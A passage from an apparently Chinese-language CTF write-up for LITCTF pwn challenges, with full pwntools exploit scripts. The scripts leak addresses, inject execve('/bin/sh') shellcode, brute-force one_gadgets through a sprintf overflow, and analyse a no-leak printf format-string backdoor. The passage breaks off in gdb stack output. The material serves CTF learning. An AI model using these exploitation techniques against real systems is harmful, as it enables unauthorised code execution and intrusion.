class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./x&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;litctf.org&#x27;</span>,<span class="string">&#x27;31778&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1668)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lookup</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>,<span class="string">&quot;lookup&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Birthday):&quot;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>,<span class="string">&quot;store&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Birthday):&quot;</span>,index)</span><br><span class="line">    sla(<span class="string">&quot;2020)&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#for i in range(500):</span></span><br><span class="line">    <span class="comment">#print(str(i+1+196453+4000)) </span></span><br><span class="line">    <span class="comment">#store(str(i+1+196453+4000),&quot;a&quot;)</span></span><br><span class="line">    <span class="comment">#lookup(str(i+1+196453+4000))</span></span><br><span class="line">    <span class="comment">#ru(&quot;:&quot;)</span></span><br><span class="line">    <span class="comment">#print(ru(&quot;\n&quot;))</span></span><br><span class="line"></span><br><span class="line">lookup(<span class="built_in">str</span>(<span class="number">74823</span>))</span><br><span class="line">ru(<span class="string">&quot;Value for \&quot;74823\&quot;: &quot;</span>)</span><br><span class="line">leak_addr = u64(ru(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0x1581</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">printx = pro_base + <span class="number">0x1375</span></span><br><span class="line">puts_got = pro_base + <span class="number">0x3F70</span></span><br><span class="line">puts_plt = pro_base + <span class="number">0x1150</span></span><br><span class="line"></span><br><span class="line">payload = p16(printx % <span class="number">0x10000</span>) <span class="comment"># checkPrintable</span></span><br><span class="line">store(<span class="built_in">str</span>(<span class="number">200796</span>),payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">mmap_base = leak_addr - <span class="number">0x20</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;mmap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(mmap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">store(<span class="string">&quot;0&quot;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">shellcode_addr = mmap_base + <span class="number">0x3658</span></span><br><span class="line">payload = p64(shellcode_addr) <span class="comment"># lookup</span></span><br><span class="line">store(<span class="built_in">str</span>(<span class="number">122935</span>),payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;$ &quot;</span>,<span class="string">&quot;lookup&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">1b</span>f9e09eafed1670b2cc74bb1f662031a0a6796c, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>栈溢出漏洞和格式化字符串漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">chunk[read(<span class="number">0</span>, chunk, <span class="number">0x80</span>uLL) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(s, chunk);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>printf 在内部调用 vfprintf，尝试覆盖 printf 的返回地址但没有成功</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7e5a0f4</span> &lt;__vsprintf_internal+<span class="number">164</span>&gt;    call   __vfprintf_internal                &lt;__vfprintf_internal&gt;</span><br><span class="line">       rdi: <span class="number">0x7fffffffda00</span> ◂— <span class="number">0xfffffffffbad8001</span></span><br><span class="line">       rsi: <span class="number">0x55555555b2a0</span> ◂— <span class="number">0x6325</span> <span class="comment">/* &#x27;%c&#x27; */</span></span><br><span class="line">       rdx: <span class="number">0x7fffffffdb40</span> ◂— <span class="number">0x3000000010</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>还有一个解法就是爆破 one_gadget，有 1/4096 的概率可以打通（由于 sprintf 会在后面自动添加 <code>\x00</code> 导致要多爆破两位）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xe3afe</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == <span class="literal">NULL</span> || r15 == <span class="literal">NULL</span></span><br><span class="line">  [r12] == <span class="literal">NULL</span> || r12 == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b01</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == <span class="literal">NULL</span> || r15 == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b04</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RDX  <span class="number">0x0</span></span><br><span class="line">R15  <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
<p>比赛时看这概率很低，于是就不打算爆了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./s1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">local = 1</span></span><br><span class="line"><span class="string">if local:</span></span><br><span class="line"><span class="string">    p = process(challenge)</span></span><br><span class="line"><span class="string">    #p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    p = remote(&#x27;litctf.org&#x27;,&#x27;31778&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1242)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    one_gadgets = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">    payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + <span class="string">&quot;\x01\x1b&quot;</span></span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="comment">#p = remote(&#x27;1.13.101.243&#x27;,&#x27;25752&#x27;)</span></span><br><span class="line">        p = process(challenge)</span><br><span class="line">        pwn()</span><br><span class="line">        sl(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">        flag = ru(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="stiller-printf"><a href="#stiller-printf" class="headerlink" title="stiller-printf"></a>stiller-printf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.36</span><span class="number">-0u</span>buntu4)</span> stable release version 2.36.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">stiller-<span class="built_in">printf</span>: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">2</span>a6ab53bcdd0f2439e5ecf85bff7b3d5a43048e1, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<p>本题目有个特殊的地方，其二进制文件是用 python 启动的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">pwn.context.log_level = <span class="string">&#x27;critical&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">input</span>(<span class="string">&quot;Payload: &quot;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(payload) &gt;= <span class="number">0x100</span> <span class="keyword">or</span> <span class="keyword">not</span> payload.isascii():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;NO!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    token = secrets.token_hex(<span class="number">0x40</span>).encode()</span><br><span class="line">    f.write(token)</span><br><span class="line">    f.close()</span><br><span class="line">    con = pwn.process(<span class="string">&quot;./stiller-printf&quot;</span>, stdout=<span class="built_in">open</span>(<span class="string">&#x27;/dev/null&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>))</span><br><span class="line">    con.sendline(payload)</span><br><span class="line">    ret = con.poll(<span class="literal">True</span>) == <span class="number">0</span></span><br><span class="line">    con.close()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;win.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        ret = f.read() == token <span class="keyword">and</span> ret</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">total = <span class="number">150</span></span><br><span class="line">passed = <span class="built_in">sum</span>([check(payload) <span class="keyword">for</span> _ <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(total))])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Total: <span class="subst">&#123;total&#125;</span> Passed: <span class="subst">&#123;passed&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> passed &gt; <span class="number">58</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CONSISTENT ENOUGH FOR ME :D&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;LITCTF&#123;FLAG&#125;&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NOT CONSISTENT ENOUGH&quot;</span>)</span><br><span class="line">exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>check</code> 的通过条件是：文件 <code>secret.txt</code> 和 <code>win.txt</code> 中的内容相同</li>
<li>运行150次，如果通过此时超过58即可获取 flag（需要爆破概率超过 1/3）</li>
<li>程序使用管道进行通信，不存在大量的字符阻塞IO的限制</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>格式化字符串漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fgets(s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="built_in">printf</span>(s);</span><br></pre></td></tr></table></figure>
<p>程序中有后门：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fds = open(<span class="string">&quot;secret.txt&quot;</span>, <span class="number">0</span>);</span><br><span class="line">fdw = open(<span class="string">&quot;win.txt&quot;</span>, <span class="number">0x41</span>, <span class="number">448LL</span>);</span><br><span class="line">len = read(fds, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">write(fdw, buf, len);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>利用格式化字符串漏洞执行后门函数即可，程序对通过率有限制，必须在无泄漏的情况下编写高通过率的 payload</p>
<p>核心思路就是覆盖 printf 返回地址的末尾一字节为 0x09，将其变为后门函数（在使用 %n 覆盖较小尺寸的数据时，需要令此数据在 mod 256 后等于 0x09）</p>
<p>面对无泄露的 fmt，需要先寻找合适的指针链，断点到 printf 刚刚调用时打印栈数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7ffed951a4c8</span> —▸ <span class="number">0x56406778a2e7</span> ◂— mov    edi, <span class="number">1</span> <span class="comment">/* printf返回地址 */</span></span><br><span class="line">    ......</span><br><span class="line"><span class="number">21</span>:<span class="number">0108</span>│ rbp <span class="number">0x7ffed951a5d0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">22</span>:<span class="number">0110</span>│     <span class="number">0x7ffed951a5d8</span> —▸ <span class="number">0x7fc034d97510</span> ◂— mov    edi, eax</span><br><span class="line"><span class="number">23</span>:<span class="number">0118</span>│     <span class="number">0x7ffed951a5e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">24</span>:<span class="number">0120</span>│     <span class="number">0x7ffed951a5e8</span> —▸ <span class="number">0x56406778a295</span> ◂— endbr64 </span><br><span class="line"><span class="number">25</span>:<span class="number">0128</span>│     <span class="number">0x7ffed951a5f0</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">26</span>:<span class="number">0130</span>│     <span 